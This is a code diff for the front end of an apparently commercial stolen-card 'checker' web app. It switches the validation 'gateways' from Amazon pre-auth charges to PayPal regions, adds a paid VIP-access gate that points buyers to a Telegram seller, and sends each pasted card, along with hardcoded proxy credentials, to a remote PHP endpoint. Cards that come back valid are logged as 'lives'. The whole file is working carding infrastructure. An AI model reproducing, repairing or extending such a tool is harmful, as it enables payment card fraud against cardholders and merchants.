@@ -7,7 +7,7 @@
         <div
             class="inline-flex items-center gap-2 w-full rounded-full border border-white/10 bg-white/5 px-3 py-2 text-xs text-white/70 backdrop-blur-xl">
             <span class="h-1.5 w-1.5 rounded-full bg-[#7aa7ff] shadow-[0_0_18px_rgba(122,167,255,0.9)]"></span>
-            Dashboard • Checker
+            Dashboard • Vip Checker
         </div>
         <div class="mt-4 mb-5 md:mb-7">
             <div class="flex items-center gap-3">
@@ -19,7 +19,7 @@
                 <div class="min-w-0">
                     <h2 class="text-xl md:text-3xl font-black tracking-tight text-white">Checker</h2>
                     <p class="text-sm text-white/55">
-                        Paste your cards, configure gateway + cookies, and start checking.
+                        Paste your cards, configure gateway and start checking.
                     </p>
                 </div>
 
@@ -272,19 +272,10 @@
                                 </span>
                                 <div>
                                     <h2 class="text-xl font-black text-white">Settings</h2>
-                                    <p class="text-sm text-white/55">Configure cookies, threads and gateway.</p>
+                                    <p class="text-sm text-white/55">Configure threads and gateway.</p>
                                 </div>
                             </div>
 
-                            <!-- Cookies -->
-                            <div>
-                                <label class="block text-white/80 font-bold text-sm mb-2">Cookies</label>
-                                <textarea v-model="settings.cookies" rows="2"
-                                    class="w-full rounded-2xl px-4 py-3 bg-black/25 border border-white/10 text-white font-mono text-sm
-                         outline-none resize-none focus:border-white/20 focus:ring-2 focus:ring-[#7aa7ff]/25 transition"
-                                    placeholder="Paste your cookies here"></textarea>
-                                <div class="text-white/50 text-xs mt-2">Paste cookies if required by the gateway.</div>
-                            </div>
 
                             <!-- Threads -->
                             <div>
@@ -303,39 +294,11 @@
                                 <select v-model="settings.gateway" class="w-full rounded-2xl px-4 py-3 bg-black/25 border border-white/10 text-white outline-none
                          focus:border-white/20 focus:ring-2 focus:ring-[#7aa7ff]/25 transition">
                                     <option disabled>Gateway Host</option>
-                                    <option>Amazon US (Faster Pre-auth)</option>
-                                    <option>Amazon ES (Pre-auth)</option>
-                                    <option>Amazon IT (Pre-auth)</option>
-                                    <option>Amazon UK (Pre-auth)</option>
-                                    <option>Amazon MX (Charge ~$1)</option>
-                                    <option>Amazon AE (Charge ~$1)</option>
+                                    <option>PayPal US</option>
+                                    <option>PayPal CA</option>
+                                    <option>PayPal BR</option>
                                 </select>
                                 <div class="text-white/50 text-xs mt-2">Choose the connection domain.</div>
-                            </div>
-
-                            <!-- Experimental -->
-                            <div>
-                                <div class="text-white/80 font-bold text-sm mb-2 flex items-center gap-2">
-                                    <Icon name="mdi:flask-outline" class="text-[#7aa7ff]" size="18" />
-                                    Experimental
-                                </div>
-
-                                <div
-                                    class="rounded-2xl border border-white/10 bg-black/20 p-4 flex items-center justify-between gap-4">
-                                    <div>
-                                        <div class="text-white font-semibold">Remove cards</div>
-                                        <div class="text-white/55 text-xs">Try to remove cards after checking</div>
-                                    </div>
-
-                                    <label class="relative inline-flex items-center cursor-pointer">
-                                        <input type="checkbox" v-model="settings.removeCards" class="sr-only peer" />
-                                        <div
-                                            class="w-11 h-6 bg-white/10 rounded-full peer peer-checked:bg-[#7aa7ff]/40 transition-colors">
-                                        </div>
-                                        <div class="absolute left-0.5 top-0.5 w-5 h-5 bg-white rounded-full shadow-md
-                             transition-transform peer-checked:translate-x-5"></div>
-                                    </label>
-                                </div>
                             </div>
 
                             <!-- Buttons -->
@@ -397,6 +360,45 @@
                 </transition>
             </div>
         </transition>
+
+        <!-- No Access Modal -->
+        <transition name="modal-fade">
+            <div v-if="showNoAccessModal" class="fixed inset-0 z-50 flex items-center justify-center px-4">
+                <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" @click="showNoAccessModal = false"></div>
+
+                <transition name="modal-zoom">
+                    <div class="relative w-full max-w-sm rounded-3xl border border-white/10 bg-white/5 backdrop-blur-xl
+                   p-6 sm:p-7 shadow-[0_24px_90px_rgba(0,0,0,0.70)] overflow-hidden">
+                        <div
+                            class="pointer-events-none absolute -inset-1 opacity-60 bg-[radial-gradient(circle_at_top,rgba(244,63,94,0.18),transparent_55%)]">
+                        </div>
+
+                        <button @click="showNoAccessModal = false"
+                            class="absolute top-4 right-4 w-10 h-10 rounded-full hover:bg-white/10 transition flex items-center justify-center">
+                            <Icon name="mdi:close" size="22" class="text-white/70" />
+                        </button>
+
+                        <div class="relative flex flex-col items-center gap-4">
+                            <Icon name="mdi:alert-circle-outline" size="48" class="text-rose-300" />
+                            <h2 class="text-xl font-black text-white text-center">You don't have access to this checker!
+                            </h2>
+                            <p class="text-white/60 text-center text-sm">
+                                You need to purchase with <span class="text-rose-300 font-bold">@yuzuuk1</span> to use this
+                                checker.
+                            </p>
+
+                            <a href="https://t.me/yuzuuk1" target="_blank" rel="noopener" class="w-full">
+                                <button @click="showNoAccessModal = false"
+                                    class="w-full rounded-2xl px-5 py-3 font-bold text-sm text-white
+                         bg-[#7aa7ff]/15 border border-[#7aa7ff]/30 hover:bg-[#7aa7ff]/20 hover:border-[#7aa7ff]/40 transition">
+                                    Contact Me!
+                                </button>
+                            </a>
+                        </div>
+                    </div>
+                </transition>
+            </div>
+        </transition>
     </div>
 </template>
 
@@ -421,6 +423,7 @@ const loaded = ref(0)
 const genBin = ref('')
 
 const showNoBalanceModal = ref(false)
+const showNoAccessModal = ref(false)
 const errorMessage = ref('')
 const showConfig = ref(false)
 
@@ -428,23 +431,26 @@ const statsRef = doc(db, "general", "totalChecked")
 
 const settings = ref({
     threads: 1,
-    gateway: 'Amazon US (Faster Pre-auth)',
-    removeCards: false,
+    gateway: 'PayPal US',
     approvedLog: false,
-    cookies: ''
 })
 
 const hideApproved = ref(false)
 const hideRefused = ref(true)
 
 const gatewayMap = {
-    'Amazon US (Faster Pre-auth)': 'US',
-    'Amazon ES (Pre-auth)': 'ES',
-    'Amazon IT (Pre-auth)': 'IT',
-    'Amazon UK (Pre-auth)': 'UK',
-    'Amazon MX (Charge ~$1)': 'MX',
-    'Amazon AE (Charge ~$1)': 'AE'
+    'PayPal US': 'US',
+    'PayPal CA': 'CA',
+    'PayPal BR': 'BR'
 }
+
+const apiMap = {
+    'PayPal US': 'us',
+    'PayPal CA': 'ca',
+    'PayPal BR': 'bra'
+}
+
+const proxyValue = 'proxy.oculus-proxy.com:31112:oc-84314131dbfccdae1fc4dd104d5b8263adf35c1d114192ee88158d68e8583cf0:m64922lkgp26'
 
 // Load settings
 if (typeof window !== 'undefined') {
@@ -519,11 +525,6 @@ function generateCards() {
 
 async function startCheck() {
     errorMessage.value = ''
-
-    if (!settings.value.cookies.trim()) {
-        errorMessage.value = 'You must insert cookies in the settings before starting the checker.'
-        return
-    }
     if (!cardsInput.value.trim()) return
 
     playAudio(audioSuccess)
@@ -539,12 +540,18 @@ async function startCheck() {
     const userData = userSnap.data() || {}
 
     let balance = Number(userData.balance ?? 0)
+    let vipAccess = userData.vipAccess ?? false
     let checksMonth = Number(userData.checksMonth ?? 0)
     let livesUsed = Number(userData.livesUsed ?? 0)
     let avgSpentWeek = Number(userData.avgSpentWeek ?? 0)
 
     if (balance < 0.10) {
         showNoBalanceModal.value = true
+        return
+    }
+
+    if (vipAccess == false) {
+        showNoAccessModal.value = true
         return
     }
 
@@ -562,65 +569,127 @@ async function startCheck() {
     async function processCard(card) {
         if (!loading.value) return
         try {
-            await updateDoc(statsRef, { cards: increment(1) })
+            // incrementa contador global de cards testados
+            try { await updateDoc(statsRef, { cards: increment(1) }) } catch (e) { console.warn('stats.cards increment failed', e) }
+
+            // incrementa contador do usuário para cartões testados
+            try { await updateDoc(userRef, { cardsBought: increment(1) }) } catch (e) { console.warn('user.cardsBought increment failed', e) }
+
             currentCard.value = card
 
-            const res = await fetch('https://vortexcenter.xyz/3bfa94eb-fbdb-46f5-9940-903334cda078/checker', {
+            // escolhe qual endpoint .php usar conforme gateway selecionado
+            const api = apiMap[settings.value.gateway] || 'bra'
+            const url = `http://181.41.201.20/${api}.php`
+
+            // corpo application/x-www-form-urlencoded: proxy=<...>&lista=<card>
+            const body = new URLSearchParams({ proxy: proxyValue, lista: card }).toString()
+
+            const res = await fetch(url, {
                 method: 'POST',
-                headers: {
-                    accept: '*/*',
-                    'content-type': 'application/json',
-                    Authorization: 'c707825b-b46f-4de9-b2b6-9ba414d6b55c'
-                },
-                body: JSON.stringify({
-                    card,
-                    cookie: settings.value.cookies || '',
-                    host: gatewayMap[settings.value.gateway] || 'US',
-                    removeCards: settings.value.removeCards,
-                    autoSave: settings.value.approvedLog
-                })
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body
             })
 
-            const data = await res.json()
+            const text = await res.text()
 
-            if (data.return && (data.return.status === 'success' || data.return.status === 'approved')) {
+            // tenta interpretar resposta como JSON; se falhar, usa texto bruto
+            let json = null
+            try {
+                json = JSON.parse(text)
+            } catch (e) {
+                json = null
+            }
+
+            // helper: retorna "lista | code" quando possível
+            function compactOutput(jsonObj, rawText, fallbackCard) {
+                if (jsonObj) {
+                    const listaVal = jsonObj.lista ?? fallbackCard
+                    const codeVal = jsonObj.code ?? ''
+                    return codeVal ? `${listaVal} ➔ ${codeVal}` : `${listaVal}`
+                }
+                const listaMatch = rawText && rawText.match(/(\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4})/)
+                const codeMatch = rawText && rawText.match(/"code"\s*:\s*"([^"]+)"|code:?\s*([A-Z0-9_]+)/i)
+                const listaVal = listaMatch ? listaMatch[1] : fallbackCard
+                const codeVal = codeMatch ? (codeMatch[1] || codeMatch[2]) : ''
+                return codeVal ? `${listaVal} | ${codeVal}` : `${listaVal}`
+            }
+
+            // determina se aprovado: prefer JSON.status == "Aprovada" (case-insensitive), fallback para heurística no texto
+            let isApproved = false
+            if (json && json.status) {
+                const st = String(json.status).toLowerCase()
+                if (st === 'aprovada' || st === 'approved' || st === 'success') isApproved = true
+            }
+
+            const approvedRegex = /(aprovad|approved|sucesso|success)/i
+            if (!isApproved && approvedRegex.test(text)) isApproved = true
+
+            if (isApproved) {
+                const html = compactOutput(json, text, card)
+
                 approved.value.push({
                     type: 'approved',
-                    card: data.card,
-                    html: data.return.html
+                    card,
+                    html
                 })
 
                 playAudio(audioLive)
 
-                // debit 0.10
+                // débito e contadores locais
                 balance = Math.max(0, balance - 0.10)
                 checksMonth += 1
                 livesUsed += 1
                 avgSpentWeek = Math.max(0, avgSpentWeek + 0.10)
 
-                await updateDoc(statsRef, { lives: increment(1) })
+                // incrementa global de lives
+                try { await updateDoc(statsRef, { lives: increment(1) }) } catch (e) { console.warn('stats.lives increment failed', e) }
 
-                // 1 update only (avoid multiple getDoc)
-                await updateDoc(userRef, {
-                    lives: arrayUnion(card),
-                    checksMonth,
-                    livesUsed,
-                    lastCheck: serverTimestamp(),
-                    balance,
-                    avgSpentWeek
-                })
+                // atualiza dados do usuário (inclui vida aprovada)
+                try {
+                    await updateDoc(userRef, {
+                        lives: arrayUnion(card),
+                        checksMonth,
+                        livesUsed,
+                        lastCheck: serverTimestamp(),
+                        balance,
+                        avgSpentWeek
+                    })
+                } catch (e) {
+                    console.warn('update user on approved failed', e)
+                }
             } else {
+                // montar saída reduzida para recusadas: somente "lista | code" quando disponível
+                let refusedHtml = ''
+                if (json) {
+                    const listaVal = json.lista ?? card
+                    const codeVal = json.code ?? ''
+                    refusedHtml = codeVal ? `${listaVal} ➔ ${codeVal}` : `${listaVal}`
+                } else {
+                    // fallback: extrair lista e code do texto bruto por regex simples
+                    const listaMatch = (text && text.match(/(\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4})/))
+                    const codeMatch = (text && text.match(/"code"\s*:\s*"([^"]+)"|code:?\s*([A-Z0-9_]+)/i))
+                    const listaVal = listaMatch ? listaMatch[1] : card
+                    const codeVal = codeMatch ? (codeMatch[1] || codeMatch[2]) : ''
+                    refusedHtml = codeVal ? `${listaVal} | ${codeVal}` : `${listaVal}`
+                }
+
                 refused.value.push({
-                    type: data.return?.status === 'error' ? 'error' : 'refused',
-                    card: data.card || card,
-                    html: data.return?.html || data.return?.message || 'Refused'
+                    type: 'refused',
+                    card,
+                    html: refusedHtml
                 })
             }
         } catch (e) {
+            console.error('processCard error', e)
+
+            // tenta extrair info do erro/texto, exibe "lista | code" quando possível
+            const errText = (e && e.message) ? e.message : ''
+            const errorHtml = compactOutput(null, errText, card)
+
             refused.value.push({
                 type: 'error',
                 card,
-                html: 'An error occurred'
+                html: errorHtml
             })
         } finally {
             tested.value++
@@ -661,10 +730,7 @@ function clearAll(type) {
 function resetSettings() {
     settings.value = {
         threads: 1,
-        gateway: 'Amazon US (Faster Pre-auth)',
-        removeCards: false,
-        approvedLog: false,
-        cookies: ''
+        gateway: 'PayPal US',
     }
     localStorage.removeItem('checkerSettings')
 }
